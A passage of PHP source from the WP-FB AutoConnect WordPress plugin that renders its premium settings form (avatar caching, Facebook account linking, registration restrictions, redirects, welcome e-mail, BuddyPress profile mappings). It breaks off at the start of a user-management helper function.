        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_signupfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_signupfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button to the Signup page (WPMU Only)', 'wp-fb-autoconnect')?> (wp-signup.php)<br /><br />
                		
		<!-- Facebook's OAuth 2.0 migration BROKE my ability to localize the XFBML-generated dialog.  I've reported a bug, and will do my best to fix it as soon as possible.
		 <b>Facebook Localization:</b><br />
		<?php add_option($opt_jfbp_localize_facebook, 1); ?>
		<input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_localize_facebook?>" value="1" <?php echo get_option($opt_jfbp_localize_facebook)?"checked='checked'":""?> >
		Translate Facebook prompts to the same locale as your Wordpress blog (Detected locale: <i><?php echo ( (defined('WPLANG')&&WPLANG!="") ? WPLANG : "en_US" ); ?></i>)
		<dfn title="The Wordpress locale is specified in wp-config.php, where valid language codes are of the form 'en_US', 'ja_JP', 'es_LA', etc.  Please see http://codex.wordpress.org/Installing_WordPress_in_Your_Language for more information on localizing Wordpress, and http://developers.facebook.com/docs/internationalization/ for a list of locales supported by Facebook.">(Mouseover for more info)</dfn><br /><br />
		 -->
						
        <b><?php _e('Avatars', 'wp-fb-autoconnect')?>:</b><br />
   		<script type="text/javascript">function isNumber(evt) {evt = (evt) ? evt : window.event;var charCode = (evt.which) ? evt.which : evt.keyCode; if (charCode > 31 && (charCode < 48 || charCode > 57)) { return false;}return true;}</script>  
        <?php 
        add_option($opt_jfbp_cache_avatars_fullsize, get_option($opt_jfbp_cache_avatars)); 
		add_option($opt_jfbp_avatar_full_dimensions_w, 200);
		add_option($opt_jfbp_avatar_full_dimensions_h, 200);        
        ?> 
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_cache_avatars?>" value="1" <?php echo get_option($opt_jfbp_cache_avatars)?'checked="checked"':''?> />
        <?php _e('Cache Facebook avatars locally', 'wp-fb-autoconnect')?> (<?php _e('thumbnail', 'wp-fb-autoconnect')?>) <?php jfb_output_simple_lightbox("", __("This will make a local copy of Facebook avatars, so they'll always load reliably, even if Facebook's servers go offline or if a user deletes their photo from Facebook. They will be fetched and updated whenever a user logs in.", "wp-fb-autoconnect"));?><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_cache_avatars_fullsize?>" value="1" <?php echo get_option($opt_jfbp_cache_avatars_fullsize)?'checked="checked"':''?> />
        <?php _e('Cache Facebook avatars locally', 'wp-fb-autoconnect')?> (<?php _e('large', 'wp-fb-autoconnect')?>):
		<input <?php disableatt() ?> onkeypress="return isNumber(event)" type="text" size="4" name="<?php echo $opt_jfbp_avatar_full_dimensions_w; ?>" value="<?php echo get_option($opt_jfbp_avatar_full_dimensions_w) ?>" />
		x
		<input <?php disableatt() ?> onkeypress="return isNumber(event)" type="text" size="4" name="<?php echo $opt_jfbp_avatar_full_dimensions_h; ?>" value="<?php echo get_option($opt_jfbp_avatar_full_dimensions_h) ?>" />
	    <?php jfb_output_simple_lightbox("", __("The 'thumbnail' avatar is what will be shown when your theme requests avatars sized 50x50 or less (Facebook's default thumbnail size).  If your theme displays avatars larger than this, you'll want to cache larger avatars as well (but note that there's a small per-login performance cost to copying the files locally, so if you're not actually using large avatars, I recommend leaving this option disabled).", 'wp-fb-autoconnect') . "<br/><br/>" . 
	    								     __("Please note that the dimensions you specify should be considered a MAXIMUM; Facebook will attempt to scale the avatar as close to your requested dimensions as possible, and then crop it down to fit.  If you just want the largest possible image, you can enter very large numbers (i.e. 99999x99999).  But since the final size is not precisely guaranteed, please consider using CSS to ensure the images mesh nicely with your theme.", 'wp-fb-autoconnect'))?><br/>
        
        <?php add_option($opt_jfbp_cache_avatar_dir, 'facebook-avatars'); ?>
        <?php _e('Cache dir', 'wp-fb-autoconnect')?>:
            <?php
            //If this is multisite, we'll allow the use of the uploaddir of *any* blog in the network (not just the current one).
            //This way, all the blogs can share the same avatar cache if desired.
            if(function_exists('is_multisite') && is_multisite())
            {
                global $wpdb;
                $blogs = $wpdb->get_results( $wpdb->prepare("SELECT blog_id, domain, path FROM $wpdb->blogs WHERE site_id = %d AND public = '1' AND archived = '0' AND mature = '0' AND spam = '0' AND deleted = '0' ORDER BY registered ASC", $wpdb->siteid), ARRAY_A );
                echo "<select name='".$opt_jfbp_cachedir_changetoblog."'>";
                foreach ($blogs AS $blog)
                {
                    switch_to_blog($blog['blog_id']);
                    $path = wp_upload_dir();
                    restore_current_blog();
                    $selectedBlogID = get_option($opt_jfbp_cachedir_changetoblog);
                    if($selectedBlogID == 0) $selectedBlogID = get_current_blog_id();
                    $selected = ($selectedBlogID == $blog['blog_id'])?" selected='true' ":'';
                    echo '<option '.$selected.' value="'.$blog['blog_id'].'">'.$path['basedir'].'</option>';
                }
                echo "</select>\\";
            }
            //If this is NOT multisite, we'll always use the current blog's upload_dir as the basedir for our avatar cache
            else
            {
                $path = wp_upload_dir();
                update_option($opt_jfbp_cachedir_changetoblog, 0);
                ?><span style="background-color:#FFFFFF; color:#aaaaaa; padding:2px 0;"><i><?php echo $path['basedir']; ?>/</i></span><?php
            }
            ?>
        <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_cache_avatar_dir; ?>" value="<?php echo get_option($opt_jfbp_cache_avatar_dir); ?>" />
        <?php jfb_output_simple_lightbox("", __("Changing the cache directory will not move existing avatars or update existing users; it only applies to subsequent logins.  It's therefore recommended that you choose a cache directory once, then leave it be.", 'wp-fb-autoconnect'))?><br /><br/>
<!--        
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_wordbooker_integrate?>" value="1" <?php echo get_option($opt_jfbp_wordbooker_integrate)?'checked="checked"':''?> /> <?php _e('Use Facebook avatars for comments imported by the Wordbooker plugin', 'wp-fb-autoconnect')?>
        <?php jfb_output_simple_lightbox("", __("The Wordbooker plugin allows you to push blog posts to your Facebook wall, and also to import comments on these posts back to your blog.  This option will display real Facebook avatars for imported comments, provided the commentor logs into your site at least once.", 'wp-fb-autoconnect'))?><br /><br />
-->

        <b><?php _e('Manual Linking & Unlinking', 'wp-fb-autoconnect')?>:</b><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_allow_link?>" value="1" <?php echo get_option($opt_jfbp_allow_link)?'checked="checked"':''?> /> <?php _e('Allow users to manually link their Wordpress/Buddypress accounts to Facebook', 'wp-fb-autoconnect')?>
        <?php jfb_output_simple_lightbox("", __("This will add a button to each non-Facebook-connected user's Wordpress (and Buddypress) profile page, allowing them to manually link their blog account to their Facebook profile.  Although this plugin does try to match connecting Facebook users to existing Wordpress accounts by e-mail, this option provides a way for users to explicitly identify their local blog account - even if their e-mails don't match.", 'wp-fb-autoconnect'))?><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_allow_disassociate?>" value="1" <?php echo get_option($opt_jfbp_allow_disassociate)?'checked="checked"':''?> /> <?php _e('Allow users to disassociate their Wordpress/Buddypress accounts from Facebook', 'wp-fb-autoconnect')?>
        <?php jfb_output_simple_lightbox("", __("This will add a button to each connected user's Wordpress (and Buddypress) profile page, allowing them to disassociate their blog account from their Facebook profile.  User accounts which are not connected to Facebook will display 'Not Connected' in place of a button.", 'wp-fb-autoconnect'))?><br />
        <input disabled='disabled' type="checkbox" name="admindisassociate" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> /> <?php _e('Allow administrators to disassociate Wordpress/Buddypress user accounts from Facebook', 'wp-fb-autoconnect')?>
        <?php jfb_output_simple_lightbox("", __("This option is always enabled for administrators.", 'wp-fb-autoconnect'))?><br />
        
        <?php add_option($opt_jfbp_link_buttontext, __("Link with Facebook", 'wp-fb-autoconnect'));?>
        <?php add_option($opt_jfbp_unlink_buttontext, __("Disassociate From Facebook", 'wp-fb-autoconnect'));?>
        <?php _e('Link button text (shown on user profiles)', 'wp-fb-autoconnect')?>: <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_link_buttontext; ?>" value="<?php echo get_option($opt_jfbp_link_buttontext); ?>" /><br />
        <?php _e('Disassociate button text (shown on user profiles)', 'wp-fb-autoconnect')?>: <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_unlink_buttontext; ?>" value="<?php echo get_option($opt_jfbp_unlink_buttontext); ?>" /><br /><br/>

        <b><?php _e('Shortcode Support', 'wp-fb-autoconnect')?>:</b><br />
        <input disabled='disabled' type="checkbox" name="shortcodesupport" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> />
        <?php _e('Enable shortcode for rendering Facebook buttons to your posts and pages', 'wp-fb-autoconnect')?>
        <?php 
        $lbContent = sprintf(__("Shortcode support will allow you to manually place Facebook login buttons in your posts or pages, simply by inserting the tag %s in their content. The Facebook button will only be shown when nobody is logged into the site; otherwise, nothing is shown.  If you'd like to specify something to output for logged-in users, you can use the %s parameter, like %s.", 'wp-fb-autoconnect'), "<b>[jfb_facebook_btn]</b>", "'loggedin'", "<b>[jfb_facebook_btn loggedin='Welcome!']</b>");
        $lbContent .= "<br/><br/>";
        $lbContent .= sprintf(__("With the Premium addon installed, shortcode support is always enabled.  For general information on Wordpress shortcode, please see %s.", 'wp-fb-autoconnect'), "<a href='http://codex.wordpress.org/Shortcode' target='shortcode'>http://codex.wordpress.org/Shortcode</a>"); 
        jfb_output_simple_lightbox("", $lbContent)?><br /><br />
            
        <b><?php _e('Double Logins', 'wp-fb-autoconnect')?>:</b><br />
        <input disabled='disabled' type="checkbox" name="doublelogin" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> />
        <?php _e('Automatically handle double logins', 'wp-fb-autoconnect')?> 
        <?php jfb_output_simple_lightbox("", sprintf(__("If a visitor opens two browser windows, logs into one, then logs into the other, the security nonce check will fail.  This is because in the second window, the current user no longer matches the user for which the nonce was generated.  The free version of the plugin reports this to the visitor, giving them a link to their desired redirect page.  The premium version will transparently handle such double-logins: to visitors, it'll look like the page has just been refreshed and they're now logged in.  For more information on nonces, please visit %s.", 'wp-fb-autoconnect'), "<a href='http://codex.wordpress.org/WordPress_Nonces' target='nonces'>http://codex.wordpress.org/WordPress_Nonces</a>"))?><br /><br />
        
		<b><?php _e('Autoregistered User Role', 'wp-fb-autoconnect')?>:</b><br />
		<?php
		add_option($opt_jfbp_autoregistered_role, get_option('default_role'));
		$currSelection = get_option($opt_jfbp_autoregistered_role);
		$editable_roles = get_editable_roles();
		if ( empty( $editable_roles[$currSelection] ) ) $currSelection = get_option('default_role');
		?>
		<?php _e('Users who are autoregistered with Facebook will be created with the role:', 'wp-fb-autoconnect')?> 
		<select <?php disableatt() ?> name="<?php echo $opt_jfbp_autoregistered_role?>" id="<?php echo $opt_jfbp_autoregistered_role?>">
			<?php wp_dropdown_roles( $currSelection ); ?>
		</select><br /><br />

        <b><?php _e('Widget Appearance', 'wp-fb-autoconnect')?>:</b><br />
        <?php echo sprintf(__("Please use the %s if you'd like to:", 'wp-fb-autoconnect'), "<a href='".admin_url('widgets.php')."' target='widgets'>WP-FB AutoConnect <b><i>Premium</i></b> Widget</a>"); ?><br />
        &bull; <?php _e("Customize the Widget's text", 'wp-fb-autoconnect')?> <?php jfb_output_simple_lightbox("", __("You can customize the text of: User, Pass, Login, Remember, Forgot, Logout, Edit Profile, Welcome.", 'wp-fb-autoconnect'))?><br />
        &bull; <?php _e("Show/Hide any of the Widget's links, checkboxes, or textfields", 'wp-fb-autoconnect')?> <?php jfb_output_simple_lightbox("", __("You can show or hide:", 'wp-fb-autoconnect') . "<ul style='list-style-type:disc;list-style-position:inside;'><li>".__('The User/Pass fields (leaving Facebook as the only way to login)', 'wp-fb-autoconnect')."</li><li>".__("The 'Register' link (only applicable if registration is enabled on the site/network)", 'wp-fb-autoconnect')."</li><li>".__("The 'Remember' tickbox", 'wp-fb-autoconnect')."</li><li>".__("The 'Edit Profile' link", 'wp-fb-autoconnect')."</li><li>".__("The 'Forgot Password' link",'wp-fb-autoconnect')."</li></ul>")?><br />      
        &bull; <?php _e("Show the user's avatar next to their username (when logged in)", 'wp-fb-autoconnect')?><br />
		&bull; <?php _e("Point the 'Edit Profile' link to the BP profile, rather than WP", 'wp-fb-autoconnect')?><br/>
		&bull; <?php _e("Point the 'Forgot Password' link to a custom URL of your choosing", 'wp-fb-autoconnect')?><br />
        &bull; <?php _e("Allow the user to simultaneously logout of your site *and* Facebook", 'wp-fb-autoconnect')?><br /><br />
            
        <b><?php _e('AJAX Spinner', 'wp-fb-autoconnect')?>:</b><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="0" <?php echo (get_option($opt_jfbp_show_spinner)==0?"checked='checked'":"")?> ><?php _e("Don't show an AJAX spinner", 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="1" <?php echo (get_option($opt_jfbp_show_spinner)==1?"checked='checked'":"")?> ><?php _e('Show a white AJAX spinner to indicate the login process has started', 'wp-fb-autoconnect')?> (<img src=" <?php echo $jfb_data_url ?>/assets/spinner_white.gif" alt="spinner" />)<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="2" <?php echo (get_option($opt_jfbp_show_spinner)==2?"checked='checked'":"")?> ><?php _e('Show a black AJAX spinner to indicate the login process has started', 'wp-fb-autoconnect')?> (<img src=" <?php echo $jfb_data_url ?>/assets/spinner_black.gif" alt="spinner" />)<br /><br />
                
        <b><?php _e('AutoRegistration Restrictions', 'wp-fb-autoconnect')?>:</b><br />
        <?php add_option($opt_jfbp_restrict_reg_url, '/') ?>
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="0" <?php echo (get_option($opt_jfbp_restrict_reg)==0?"checked='checked'":"")?>><?php _e('Open - Anyone can login (Default)', 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="1" <?php echo (get_option($opt_jfbp_restrict_reg)==1?"checked='checked'":"")?>><?php _e('Closed - Only login existing blog users', 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="2" <?php echo (get_option($opt_jfbp_restrict_reg)==2?"checked='checked'":"")?>><?php echo sprintf(__("Invitational - Only autoregister users who've been invited via the %s plugin", 'wp-fb-autoconnect'), '<a target="secureinvites" href="http://wordpress.org/extend/plugins/wordpress-mu-secure-invites/">Secure Invites</a>')?> <?php jfb_output_simple_lightbox("", __("For invites to work, the connecting user's Facebook email must be accessible, and it must match the email to which the invitation was sent.", 'wp-fb-autoconnect'))?><br />
		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="3" <?php echo (get_option($opt_jfbp_restrict_reg)==3?"checked='checked'":"")?>><?php _e('Friendship - Only autoregister friends of Facebook user id:', 'wp-fb-autoconnect')?> <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_uid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_uid) ?>" /> <?php jfb_output_simple_lightbox("", sprintf(__("To find your Facebook uid, login and view your Profile Pictures album.  The URL will be something like '%s'.  In this example, your uid would be 789 (the numbers after the last decimal point)."  . "<br/><br/>" . __("Note: For this feature to work, you'll need to first submit your app for review by Facebook.  Please see FAQ#56 for more info:", 'wp-fb-autoconnect') . " <a href='$jfb_homepage#faq56' target='extendedfaq'>here</a>",'wp-fb-autoconnect'), "http://www.facebook.com/media/set/?set=a.123.456.789") . "<br/><br/>Note: For this feature to work, the user you enter here must login via this Facebook app at least once after you've enabled the option, and must approve the 'Friends' permission when they do so.")?><br />
		<!--<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="4" <?php echo (get_option($opt_jfbp_restrict_reg)==4?"checked='checked'":"")?>><?php _e('Membership - Only autoregister members of Facebook group id:', 'wp-fb-autoconnect')?> <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_gid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_gid); ?>" /> <?php jfb_output_simple_lightbox("", sprintf(__("To find a group's id, view its URL.  If it's something like '%s', the id would be 12345678.  If it uses a vanity URL (like %s) and is public, you can use %s to find its id.  If the group is both private/secret AND it uses a vanity URL, you'll have to use Facebook's Graph Explorer tool to lookup the id.  Visit %s, then click 'Submit.'  Assuming you're a member of the group, you should see it listed in the result, along with its id.", 'wp-fb-autoconnect'), "www.facebook.com/groups/12345678/", "www.facebook.com/groups/MyGroupName/", "<a href='http://lookup-id.com' target='vanity'>lookup-id.com</a>", "<a href='https://developers.facebook.com/tools/explorer/?method=GET&path=me%3Ffields%3Dgroups' target='explorer'>here</a>") . "<br/><br/>" . __("In order to use this option, you'll need to submit your app for review by Facebook.  Please see FAQ#56 for more info:", 'wp-fb-autoconnect') . " <a href='$jfb_homepage#faq56' target='extendedfaq'>here</a>")?><br />-->
		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="5" <?php echo (get_option($opt_jfbp_restrict_reg)==5?"checked='checked'":"")?>><?php _e('Page - Only autoregister users who have liked Facebook page id:', 'wp-fb-autoconnect')?> <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_pid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_pid); ?>" /> <?php jfb_output_simple_lightbox("", sprintf(__("To find a page's id, view one of its photos.  The URL will be something like '%s'.  In this example, the id would be 789 (the numbers after the last decimal point).", 'wp-fb-autoconnect'),"https://www.facebook.com/pagename/photos/a.123.456.789/555") . "<br/><br/>" . __("In order to use this option, you'll need to submit your app for review by Facebook.  Please see FAQ#56 for more info:", 'wp-fb-autoconnect') . " <a href='$jfb_homepage#faq56' target='extendedfaq'>here</a>")?><br />
        <?php _e('Redirect URL for denied logins:', 'wp-fb-autoconnect')?> <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_restrict_reg_url?>" value="<?php echo get_option($opt_jfbp_restrict_reg_url) ?>" /><br /><br />
                
        <b><?php _e('Custom Redirects', 'wp-fb-autoconnect')?>:</b><br />
        <?php add_option($opt_jfbp_redirect_new, "1"); ?>
        <?php add_option($opt_jfbp_redirect_existing, "1"); ?>
        <?php add_option($opt_jfbp_redirect_logout, "1"); ?>
        <?php _e('When a new user is autoregistered on your site, redirect them to:', 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_new; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_new)==1?"checked='checked'":"")?> ><?php _e('Default (refresh current page)', 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_new; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_new)==2?"checked='checked'":"")?> ><?php _e('Custom URL', 'wp-fb-autoconnect')?>:
        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_new_custom?>" value="<?php echo get_option($opt_jfbp_redirect_new_custom) ?>" /> <small>(<?php echo sprintf(__('Supports %s variables', 'wp-fb-autoconnect'), "%username%")?>)</small><br /><br />
        <?php _e('When an existing user returns to your site, redirect them to:', 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_existing; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_existing)==1?"checked='checked'":"")?> ><?php _e('Default (refresh current page)', 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_existing; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_existing)==2?"checked='checked'":"")?> ><?php _e('Custom URL', 'wp-fb-autoconnect')?>:
        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_existing_custom?>" value="<?php echo get_option($opt_jfbp_redirect_existing_custom) ?>" /> <small>(<?php echo sprintf(__('Supports %s variables', 'wp-fb-autoconnect'), "%username%") ?>)</small><br /><br />
        <?php _e('When a user logs out of your site, redirect them to:', 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_logout; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_logout)==1?"checked='checked'":"")?> ><?php _e('Default (refresh current page)', 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_logout; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_logout)==2?"checked='checked'":"")?> ><?php _e('Custom URL', 'wp-fb-autoconnect')?>:
        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_logout_custom?>" value="<?php echo get_option($opt_jfbp_redirect_logout_custom) ?>" /><br /><br />

        <b><?php _e('Welcome Message', 'wp-fb-autoconnect')?>:</b><br />
        <?php add_option($opt_jfbp_notifyusers_content, "Thank you for logging into " . get_option('blogname') . " with Facebook.\nIf you would like to login manually, you may do so with the following credentials.\n\nUsername: %username%\nPassword: %password%"); ?>
        <?php add_option($opt_jfbp_notifyusers_subject, "Welcome to " . get_option('blogname')); ?>
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_notifyusers?>" value="1" <?php echo get_option($opt_jfbp_notifyusers)?'checked="checked"':''?> /> <?php _e('Send a custom welcome e-mail to users who register via Facebook', 'wp-fb-autoconnect')?> <small>(*<?php _e('If we know their address', 'wp-fb-autoconnect')?>)</small><br />
        <input <?php disableatt() ?> type="text" size="102" name="<?php echo $opt_jfbp_notifyusers_subject?>" value="<?php echo get_option($opt_jfbp_notifyusers_subject) ?>" /><br />
        <textarea <?php disableatt() ?> cols="85" rows="5" name="<?php echo $opt_jfbp_notifyusers_content?>"><?php echo get_option($opt_jfbp_notifyusers_content) ?></textarea><br /><br />

        <b><?php _e('BuddyPress Activity Stream', 'wp-fb-autoconnect')?>:</b><br />
        <?php add_option($opt_jfbp_bpstream_logincontent, sprintf(__("%s logged in with Facebook", 'wp-fb-autoconnect'), "%user%")); ?>
        <?php add_option($opt_jfbp_bpstream_registercontent, sprintf(__("%s registered with Facebook", 'wp-fb-autoconnect'), "%user%")); ?>
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpstream_register?>" value="1" <?php echo get_option($opt_jfbp_bpstream_register)?'checked="checked"':''?> /> <?php _e('When a new user autoconnects to your site, post to the BP Activity Stream:', 'wp-fb-autoconnect')?>
        <input <?php disableatt() ?> type="text" size="50" name="<?php echo $opt_jfbp_bpstream_registercontent?>" value="<?php echo get_option($opt_jfbp_bpstream_registercontent) ?>" /><br />
		<input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpstream_login?>" value="1" <?php echo get_option($opt_jfbp_bpstream_login)?'checked="checked"':''?> /> <?php _e('When an existing user returns to your site, post to the BP Activity Stream:', 'wp-fb-autoconnect')?>
        <input <?php disableatt() ?> type="text" size="50" name="<?php echo $opt_jfbp_bpstream_logincontent?>" value="<?php echo get_option($opt_jfbp_bpstream_logincontent) ?>" /><br /><br />
 
		<b><?php _e('BuddyPress X-Profile Mappings', 'wp-fb-autoconnect')?>:</b><br />
		<?php _e("This section will let you automatically fill in your Buddypress users' X-Profile data from their Facebook profiles.", 'wp-fb-autoconnect')?><br />
		<small>&bull; <?php _e('Some limitations exist regarding which X-Profile fields can be populated', 'wp-fb-autoconnect')?></small> <?php jfb_output_simple_lightbox("", __("Only 'Text Box,' 'Multi-Line Text Box,' and 'Date Selector'-type profile fields can be mapped at this time.  Due to unpredictability in matching freeform values from Facebook to pre-defined values on BuddyPress, support for dropdowns, radiobuttons, and checkboxes MAY be added in the future.", 'wp-fb-autoconnect'))?><br />
		<small>&bull; <?php _e('Some limitations exist regarding which Facebook fields can be imported', 'wp-fb-autoconnect')?></small> <?php jfb_output_simple_lightbox("", __("Because some Facebook fields are formatted differently, each one needs to be explicitly implemented.  I've included an initial selection of fields (i.e. Name, Gender, Birthday, etc), but if you need another field to be available, please request it on the support page and I'll do my best to add it to the next update.", 'wp-fb-autoconnect'))?><br />
		<small>&bull; <?php _e("In order to import fields marked with an asterisk (i.e. Birthday*), you'll need to submit your app for review by Facebook.  Please see FAQ#56 for more info:", 'wp-fb-autoconnect'); echo " <a href='$jfb_homepage#faq56' target='extendedfaq'>here</a>"; ?></small><br/><br/>
        		
         <?php
         //If people report problems with Buddypress detection, use this more robust method: http://codex.buddypress.org/plugin-development/checking-buddypress-is-active/
         if( !function_exists('bp_has_profile') ) echo "<i>".__("BuddyPress Not Found.  This section is only available on BuddyPress-enabled sites.",'wp-fb-autoconnect')."</i>";
         else if ( !bp_has_profile() )            echo __("Error: BuddyPress Profile Not Found.  This should never happen - if you see this message, please report it on the plugin support page.", 'wp-fb-autoconnect');
         else
         {
            //Present the 3 mapping options: disable mapping, map new users, or map new and returning users ?> 
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="0" <?php echo (get_option($opt_jfbp_xprofile_map)==0?"checked='checked'":"")?> ><?php _e('Disable Mapping', 'wp-fb-autoconnect')?>
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="1" <?php echo (get_option($opt_jfbp_xprofile_map)==1?"checked='checked'":"")?> ><?php _e('Map New Users Only', 'wp-fb-autoconnect')?>
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="2" <?php echo (get_option($opt_jfbp_xprofile_map)==2?"checked='checked'":"")?> ><?php _e('Map New And Returning Users', 'wp-fb-autoconnect')?><br /><?php
            
            //Make a list of which Facebook fields may be mapped to each type of xProfile field.  Omitted types (i.e. checkbox) are treated as "unmappable."
            //The format is "xprofile_field_type"->"(fbfieldname1, fbfieldDisplayname1), (fbfieldname2, fbfieldDisplayname2), ..."
            //(Available FB fields are documented at: https://developers.facebook.com/docs/reference/api/user/)
            $allowed_mappings = array(
            	'textbox' =>array('name'=>"Name", 'first_name'=>"First Name", 'middle_name'=>"Middle Name", 'last_name'=>"Last Name",
            					  'gender'=>"Gender*", 'link'=>"Profile URL*",
            					  "location"=>"City*",
            					  'hometown'=>"Hometown*", 'languages'=>"Languages*", 'music'=>'Music*'),
                'textarea'=>array('name'=>"Name", 'first_name'=>"First Name", 'middle_name'=>"Middle Name", 'last_name'=>"Last Name", 
                				  'gender'=>"Gender*", 'link'=>"Profile URL*",
                				  "location"=>"City*", 
                				  'hometown'=>"Hometown*", 'languages'=>"Languages*", 'music'=>'Music*'),
                'datebox' =>array('birthday'=>'Birthday*'));
			$allowed_mappings = apply_filters('wpfb_xprofile_allowed_mappings', $allowed_mappings);

            //Go through all of the XProfile fields and offer possible Facebook mappings for each (in a dropdown).
            //(current_mappings is used to set the initial state of the panel, i.e. based on what mappings are already in the db)
            $current_mappings = get_option($opt_jfbp_xprofile_mappings);
            while ( bp_profile_groups() )
            {
                //Create a "box" for each XProfile Group
                global $group;
                bp_the_profile_group();
                ?><div style="width:520px; padding:5px; margin:2px 0; background-color:#EEEDDA; border:1px solid #CCC;"><?php
                echo "Group \"$group->name\":<br />";
                
                //And populate the group box with Textarea(xprofile field)->Dropdown(possible facebook mappings)
                while ( bp_profile_fields() )
                {
                    //Output the X-Profile field textarea
                    global $field;
                    bp_the_profile_field();
                    ?><input disabled='disabled' type="text" size="20" name="<?php echo $field->name ?>" value="<?php echo $field->name; ?>" /> -&gt;
                    
                    <?php 
                    //If there aren't any available Facebook mappings, just put a disabled textbox and "hidden" field that sets this option as '0' 
                    if( !isset($allowed_mappings[$field->type]) || !$allowed_mappings[$field->type] )
                    {
                        echo "<input disabled='disabled' type='text' size='30' name='$field->name"."_unavail"."' value='(".__("No Mappings Available", 'wp-fb-autoconnect').")' />";
                        echo "<input type='hidden' name='$field->id' value='0' />";
                        continue;
                    }
                    
                    //Otherwise, list all of the available mappings in a dropdown.
                    ?><select name="<?php echo $jfb_xprofile_field_prefix . $field->id?>">
                    	<option value="0">(<?php _e('No Mapping', 'wp-fb-autoconnect')?>)</option><?php
                        foreach($allowed_mappings[$field->type] as $fbname => $userfriendlyname)
                            echo "<option " . ($current_mappings[$field->id]==$fbname?"selected":"") . " value=\"$fbname\">$userfriendlyname</option>";
    			    ?></select><br /><?php
                }
                ?></div><?php
            }
        }?>
                                        
        <input type="hidden" name="prem_opts_updated" value="1" />
        <div class="submit"><input <?php disableatt() ?> type="submit" name="Submit" value="<?php _e('Save Premium', 'wp-fb-autoconnect')?>" /></div>
    </form>
    <?php    
}


/**********************************************************************/
/**********************************************************************/
/***************************USER MANAGEMENT****************************/
/**********************************************************************/
/**********************************************************************/


//Add a column to "Users" admin page (showing uid & Facebook link of AutoConnected users)
function jfb_p_fbid_column($column_headers) {
    $column_headers['fbid'] = 'Facebook';
    return $column_headers;
}
function jfb_p_fbid_custom_column($custom_column,$column_name,$user_id)
{
    if ($column_name=='fbid') 
		$custom_column = jfb_get_fb_profilelink($user_id);
    return $custom_column;
}


//Because FB API 2.0 started returning scoped userIDs instead of real userIDs, the profile link can no longer be
//inferred from the ID alone.  Thus plugin v4.0.0+ started storing the profile link explicitly in usermeta.
//For newer users who have this usermeta, output a link; for older ones, output the "real" userID and our constructed profile.php-style link.
function jfb_get_fb_profilelink($wp_uid)
{
	global $jfb_uid_meta_name, $jfb_url_meta_name;
	$uid = get_user_meta($wp_uid, $jfb_uid_meta_name, true);
	$url = get_user_meta($wp_uid, $jfb_url_meta_name, true);
	
	if($uid && $url)
